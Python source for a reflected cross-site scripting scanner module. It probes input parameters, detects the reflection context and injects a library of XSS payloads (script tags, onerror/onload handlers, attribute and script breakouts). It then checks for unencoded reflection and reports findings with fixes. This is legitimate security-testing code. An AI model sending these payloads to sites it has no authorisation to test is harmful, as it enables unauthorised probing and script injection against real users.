"""Cross-Site Scripting (XSS) detection module.

Detection strategy:
  1. Probe — inject a unique marker and confirm it is reflected in the response.
  2. Context detection — determine whether the reflection lands in an HTML tag,
     an attribute, or a JavaScript block.
  3. Payload validation — inject context-appropriate payloads and verify that
     dangerous characters (< > " ') reach the browser unencoded.
"""

import hashlib
import re
import time
from typing import Dict, List, Optional, Tuple

import logging

from .base import BaseModule, Finding
from ..parser import build_curl_command, inject_into_params, rebuild_url_with_params

logger = logging.getLogger("vulnscanner")


def _html_escape(s: str) -> str:
    """Show what a SAFE site would return (so the user can compare side by side)."""
    return (
        s.replace("&", "&amp;").replace("<", "&lt;")
        .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#x27;")
    )


# ---------------------------------------------------------------------------
# Payload library
# ---------------------------------------------------------------------------
_PAYLOADS_HTML = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<sCrIpT>alert(1)</ScRiPt>',
    '<img/src=x onerror=alert(1)>',
    '<<script>alert(1)//<</script>',
    '<iframe src="javascript:alert(1)">',
    '<a href=javascript:alert(1)>x</a>',
]

# Attribute-context payloads.
# When user input lands inside an attribute value (e.g. <input value="HERE">),
# the strongest proof is to BREAK OUT of the attribute+tag and inject a fresh
# element that runs script *on its own*, with zero user interaction:
#   "> closes the value and the tag, then <script>/<img onerror>/<svg onload> run.
# Old payloads like `" onmouseover="alert(1)` only fire if the victim happens to
# hover the element — weak, often unprovable. These fire automatically.
_PAYLOADS_ATTR = [
    # Double-quoted attribute breakout (most common: value="...")
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    # Single-quoted attribute breakout (value='...')
    "'><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    # Breakout that auto-fires WITHOUT any user interaction (autofocus->onfocus).
    # Note: every attribute payload INCLUDES a real <tag>. That is deliberate —
    # confirmation is "did this exact string reflect unencoded?", so the payload
    # must contain a tag for its presence to actually prove markup injection. A
    # quote-only payload (e.g. `" onmouseover=...`) could reflect verbatim as
    # harmless text and cause a false positive, so we don't use those.
    '"><input autofocus onfocus=alert(1)>',
]

_PAYLOADS_SCRIPT = [
    '</script><script>alert(1)</script>',
    '";alert(1)//',
    "';alert(1)//",
    '\';alert(1)//',
    '\\";alert(1)//',
]

# Combined default order (HTML first, then attr/script)
_DEFAULT_PAYLOADS = _PAYLOADS_HTML + _PAYLOADS_ATTR + _PAYLOADS_SCRIPT


class XSSScanner(BaseModule):
    """Detects reflected XSS vulnerabilities with context-aware payload selection."""

    NAME = "xss"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self.custom_payloads: Optional[str] = config.get("custom_payloads")

    # ------------------------------------------------------------------
    # Public entry-point
    # ------------------------------------------------------------------

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        """Test *param_name* for reflected XSS."""
        # Phase 1: confirm reflection exists at all
        reflected, context = self._probe_reflection(url, method, params, param_name)
        if not reflected:
            logger.debug("[XSS] %s: no reflection — skipping payload phase", param_name)
            return []

        logger.debug("[XSS] %s: reflected in context=%s", param_name, context)

        # Phase 2: try to prove full XSS (script execution).
        finding = self._test_payloads(url, method, params, param_name, context)
        if finding:
            return [finding]

        # Phase 3: fall back to HTML injection. If the app reflects our angle
        # brackets and tags unencoded but filters/encodes the script-y bits, it's
        # not script execution — but injecting arbitrary HTML is still a real bug
        # (content spoofing, fake login forms / phishing, layout hijack). Worth
        # reporting at a lower severity so it isn't silently missed.
        finding = self._test_html_injection(url, method, params, param_name)
        return [finding] if finding else []

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _send(self, url: str, method: str, params: Dict[str, str]):
        if method == "GET":
            return self.http.get(rebuild_url_with_params(url, params))
        return self.http.post(url, data=params)

    def _probe_reflection(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Tuple[bool, str]:
        """Inject a unique alphanumeric token and verify it echoes back unmodified.

        Baseline check: if the token somehow appears in the response WITHOUT
        injection (practically impossible for a random 8-hex suffix, but safe
        to guard against), the probe is invalid.
        """
        token = "xssprobe" + hashlib.md5(
            f"{param_name}{time.perf_counter()}".encode()
        ).hexdigest()[:8]

        # Get baseline to confirm the token is not already in the page
        baseline = self._send(url, method, params)
        if baseline is not None and token.lower() in baseline.text.lower():
            # Token appears without injection — astronomically rare, but skip if so
            return False, "unknown"

        resp = self._send(url, method, inject_into_params(params, param_name, token))
        if resp is None or token.lower() not in resp.text.lower():
            return False, "unknown"

        context = self._detect_context(resp.text, token)
        return True, context

    @staticmethod
    def _detect_context(html: str, probe: str) -> str:
        """Classify where the probe appears in the HTML response."""
        idx = html.lower().find(probe.lower())
        if idx == -1:
            return "html"

        snippet = html[max(0, idx - 120): idx + len(probe) + 120]

        if re.search(
            r'<script[^>]*>[^<]*' + re.escape(probe),
            snippet,
            re.IGNORECASE | re.DOTALL,
        ):
            return "script"

        if re.search(
            r'<[^>]+\s[\w:-]+=(["\'])[^\'"]*' + re.escape(probe),
            snippet,
            re.IGNORECASE,
        ):
            return "attribute"

        return "html"

    def _test_payloads(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        context: str,
    ) -> Optional[Finding]:
        """Inject payloads matching the detected context; confirm unencoded reflection."""
        payloads = self.load_payloads(_DEFAULT_PAYLOADS, self.custom_payloads)

        # Prioritise payloads that suit the detected context
        if context == "attribute":
            priority = _PAYLOADS_ATTR + _PAYLOADS_HTML
            payloads = priority + [p for p in payloads if p not in priority]
        elif context == "script":
            priority = _PAYLOADS_SCRIPT + _PAYLOADS_HTML
            payloads = priority + [p for p in payloads if p not in priority]

        for payload in payloads:
            # A payload without a tag (e.g. the script-context breakout
            # `";alert(1)//`) is only executable when reflected INSIDE a <script>
            # block. In HTML/attribute context its verbatim reflection is harmless
            # text — confirming it there would be a false positive. So tagless
            # payloads are only accepted when the reflection context is "script".
            if "<" not in payload and context != "script":
                continue

            resp = self._send(url, method, inject_into_params(params, param_name, payload))
            if resp is None:
                continue

            confirmed, evidence = self._check_unencoded(resp.text, payload)
            if confirmed:
                logger.debug(
                    "[XSS] %s=%r reflected unencoded in %s context",
                    param_name, payload, context,
                )
                return self._make_xss_finding(
                    url, method, params, param_name, payload, context, evidence,
                )
        return None

    def _make_xss_finding(
        self, url, method, params, param_name, payload, context, evidence,
    ) -> Finding:
        """Build a reflected-XSS finding with a plain-language, step-by-step PoC."""
        full_url = rebuild_url_with_params(url, inject_into_params(params, param_name, payload)) \
            if method == "GET" else url
        # Where to paste it, in beginner terms.
        if method == "GET":
            open_step = (
                f"1. Open this exact link in your browser:\n"
                f"   {full_url}"
            )
        else:
            open_step = (
                f"1. Go to the page with the '{param_name}' field and type this into it,\n"
                f"   then submit the form:\n"
                f"   {payload}"
            )
        return Finding(
            vuln_type="Cross-Site Scripting (Reflected XSS)",
            url=url,
            method=method,
            parameter=param_name,
            payload=payload,
            evidence=evidence,
            confidence="high",
            details=(
                f"In plain terms: whatever you type into the '{param_name}' field is "
                f"dropped straight into the page's HTML without being neutralised, so "
                f"the browser treats it as CODE instead of text and runs it. Here the "
                f"input lands in the {context!r} part of the page, and the payload "
                f"{payload!r} came back exactly as sent (the < > characters were NOT "
                f"escaped to &lt; &gt;).\n"
                f"Why it matters: an attacker sends a victim a link like the one below; "
                f"when the victim opens it while logged in, the attacker's JavaScript "
                f"runs AS the victim — it can steal their session cookie, act on their "
                f"behalf, or show a fake login box.\n"
                f"Fix: HTML-encode every user-supplied value on output (< becomes &lt;, "
                f"etc.) and add a strict Content-Security-Policy as a second layer."
            ),
            reproduction=(
                f"# --- How to confirm this yourself (no tools needed) ---\n"
                f"# {open_step}\n"
                f"# 2. If a little pop-up box (an 'alert') appears, the page just ran\n"
                f"#    the script you supplied. That IS Cross-Site Scripting — confirmed.\n"
                f"# 3. Prefer to check without running code? Right-click the page >\n"
                f"#    'View Page Source', then press Ctrl+F and search for:\n"
                f"#        {payload}\n"
                f"#    - VULNERABLE: you find it with real < and > characters, exactly as above.\n"
                f"#    - SAFE (not vulnerable): you instead see it written as\n"
                f"#        {_html_escape(payload)}\n"
                f"#      (the < > were turned into &lt; &gt; — harmless text).\n"
                f"# 4. Command-line equivalent of step 1:\n"
                f"{build_curl_command(url, method, params, param_name, payload)}"
            ),
        )

    def _test_html_injection(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Detect HTML injection: arbitrary tags reflected unencoded, even when
        script execution is blocked.

        We inject a benign, uniquely-named element (e.g. ``<u>okrhtmli1234</u>``).
        If that EXACT markup — real angle brackets and all — comes back in the
        response, the app lets us inject HTML. The unique token guarantees we're
        seeing OUR injection, not markup the page already had. This is a genuine
        bug (an attacker can inject a fake login form / deface content) and is
        reported when full XSS could not be proven, so it doesn't get lost.
        """
        token = "okrhtmli" + hashlib.md5(
            f"{param_name}{time.perf_counter()}".encode()
        ).hexdigest()[:6]
        # A few benign tags; if any survives with brackets intact, it's injectable.
        markup_payloads = [
            f"<u>{token}</u>",
            f"<h1>{token}</h1>",
            f"<i>{token}</i>",
            f"<marquee>{token}</marquee>",
        ]
        for payload in markup_payloads:
            resp = self._send(url, method, inject_into_params(params, param_name, payload))
            if resp is None:
                continue
            if payload in (resp.text or ""):  # exact, brackets-intact reflection
                idx = resp.text.index(payload)
                snippet = resp.text[max(0, idx - 40): idx + len(payload) + 40].replace("\n", " ")
                full_url = rebuild_url_with_params(
                    url, inject_into_params(params, param_name, payload)
                ) if method == "GET" else url
                logger.debug("[XSS->HTMLi] %s: markup %r reflected raw", param_name, payload)
                return Finding(
                    vuln_type="HTML Injection",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Injected markup reflected unencoded: ...{snippet!r}...",
                    confidence="medium",
                    details=(
                        f"In plain terms: the '{param_name}' field lets you inject real "
                        f"HTML tags into the page (here a {payload!r} tag came back with "
                        f"its < > intact instead of being escaped). Script execution "
                        f"appears to be filtered, so this isn't full XSS — but injecting "
                        f"HTML is still dangerous: an attacker can plant a fake login form, "
                        f"deface the page, or hide/overlay content for phishing.\n"
                        f"Fix: HTML-encode user input on output so tags render as text."
                    ),
                    reproduction=(
                        f"# 1. Open this link (GET) or type the payload into '{param_name}':\n"
                        f"#    {full_url if method == 'GET' else payload}\n"
                        f"# 2. Right-click > 'View Page Source', Ctrl+F and search for:\n"
                        f"#        {payload}\n"
                        f"#    - VULNERABLE: it appears as a real tag ({payload}).\n"
                        f"#    - SAFE: it appears as text ({_html_escape(payload)}).\n"
                        f"# 3. Visual proof: <h1>/<marquee> visibly change the page layout,\n"
                        f"#    which shows your HTML was accepted as markup, not text.\n"
                        f"{build_curl_command(url, method, params, param_name, payload)}"
                    ),
                )
        return None

    @staticmethod
    def _check_unencoded(html: str, payload: str) -> Tuple[bool, str]:
        """Return (True, evidence_snippet) only when the EXACT payload appears unencoded.

        Why verbatim-only?
        Pages always contain legitimate <script> tags, onerror= attributes, and
        similar HTML from their own JavaScript. Checking for these fragments without
        anchoring to the injected payload produces false positives on any page with
        client-side code.

        Verbatim match means: the scanner injected '<script>alert(1)</script>'
        and that exact string appears in the response body without HTML-encoding.
        If the site encodes < to &lt; the payload will not match — which is correct,
        because a properly-encoded response is NOT vulnerable to XSS.
        """
        if payload in html:
            idx = html.index(payload)
            start = max(0, idx - 40)
            end = min(len(html), idx + len(payload) + 40)
            snippet = html[start:end].replace("\n", " ")
            return True, f"Payload reflected verbatim (unencoded): ...{snippet!r}..."

        return False, ""
